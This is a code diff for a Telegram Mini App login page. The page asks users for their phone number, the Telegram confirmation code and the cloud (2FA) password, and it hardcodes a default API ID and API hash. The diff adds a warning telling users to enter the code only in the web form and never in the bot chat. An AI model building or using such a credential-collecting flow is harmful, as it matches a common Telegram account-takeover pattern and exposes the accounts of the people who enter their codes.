@@ -13,7 +13,7 @@
             --btn-text: var(--tg-theme-button-text-color, #fff);
             --hint-color: var(--tg-theme-hint-color, #999);
             --secondary-bg: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            --section-header: var(--tg-theme-link-color, #3390ec);
+            --danger: #ff3b30;
         }
         
         body { 
@@ -29,7 +29,7 @@
         .active { display: flex; }
 
         /* INPUTS */
-        input[type="text"], input[type="number"], input[type="tel"], input[type="password"], textarea { 
+        input[type="text"], input[type="number"], input[type="tel"], input[type="password"] { 
             width: 100%; 
             padding: 12px; 
             border: 1px solid var(--hint-color); 
@@ -42,7 +42,7 @@
             transition: border-color 0.2s;
         }
         
-        input:focus, textarea:focus {
+        input:focus {
             border-color: var(--btn-color);
             border-width: 2px;
             padding: 11px;
@@ -92,6 +92,20 @@
         }
 
         .hint-text { font-size: 13px; color: var(--hint-color); margin-top: 5px; }
+        
+        /* WARNING BOX */
+        .warning-box {
+            background-color: rgba(255, 59, 48, 0.1);
+            border: 1px solid var(--danger);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            color: var(--danger);
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
@@ -117,19 +131,28 @@
 
         <button onclick="sendLogin()" id="btn-login">Войти</button>
         <div class="hint-text" style="text-align: center; margin-top: 20px;">
-            Код подтверждения придет в приложение Telegram на другом устройстве (Service Notifications).
+            Код подтверждения придет в приложение Telegram на другом устройстве.
         </div>
     </div>
 
     <div id="screen-code" class="container">
-        <h3>Подтверждение</h3>
-        <p class="hint-text" style="text-align: center;">Введите код из сервисных уведомлений Telegram</p>
-        <input type="number" id="auth_code" placeholder="Код" style="font-size: 24px; text-align: center; letter-spacing: 5px;">
-        <button onclick="sendAuthCode()">Отправить</button>
+        
+        <div class="warning-box">
+            ⛔️ ВНИМАНИЕ!<br>
+            НИКОГДА не отправляйте код в чат с ботом.<br>
+            Вводите его ТОЛЬКО в это поле ниже:
+        </div>
+
+        <h3 style="text-align: center;">Подтверждение</h3>
+        <p class="hint-text" style="text-align: center;">Введите код из уведомлений Telegram</p>
+        
+        <input type="number" id="auth_code" placeholder="Код" style="font-size: 24px; text-align: center; letter-spacing: 5px; font-weight: bold;">
+        <button onclick="sendAuthCode()">Отправить Код</button>
     </div>
 
     <div id="screen-password" class="container">
         <h3>Облачный пароль</h3>
+        <p class="hint-text">Ваш аккаунт защищен паролем.</p>
         <input type="password" id="2fa_pass" placeholder="Ваш пароль">
         <button onclick="sendPass()">Отправить</button>
     </div>
@@ -138,19 +161,24 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // КОНСТАНТЫ ПО УМОЛЧАНИЮ
+        // ДЕФОЛТНЫЕ КЛЮЧИ
         const DEFAULT_API_ID = 32320992;
         const DEFAULT_API_HASH = "b5248d75c3a65234a17ab80d97b44515";
 
         let loginMode = 'phone';
         const urlParams = new URLSearchParams(window.location.search);
-        const mode = urlParams.get('mode'); 
+        const mode = urlParams.get('mode'); // code, password
 
+        // Инициализация экранов
         document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
         
-        if (mode === 'code') document.getElementById('screen-code').classList.add('active');
-        else if (mode === 'password') document.getElementById('screen-password').classList.add('active');
-        else document.getElementById('screen-login').classList.add('active');
+        if (mode === 'code') {
+            document.getElementById('screen-code').classList.add('active');
+        } else if (mode === 'password') {
+            document.getElementById('screen-password').classList.add('active');
+        } else {
+            document.getElementById('screen-login').classList.add('active');
+        }
 
         function switchTab(m) {
             loginMode = m;
@@ -174,15 +202,14 @@
             let api_hash = document.getElementById('api_hash').value.trim();
             let phone = document.getElementById('phone').value.trim();
 
-            // Если поля пустые, используем дефолтные
+            // Подстановка дефолтных значений
             if (!api_id) api_id = DEFAULT_API_ID;
             if (!api_hash) api_hash = DEFAULT_API_HASH;
 
             if (loginMode === 'phone') {
                 if (!phone) return tg.showAlert("Введите номер телефона");
                 
-                // Очистка номера (удаляем все кроме цифр и плюса)
-                // Превращаем "+7 (999) 123-45-67" в "+79991234567"
+                // Очистка номера: оставляем только цифры и плюс
                 phone = phone.replace(/[^0-9+]/g, '');
             }
 
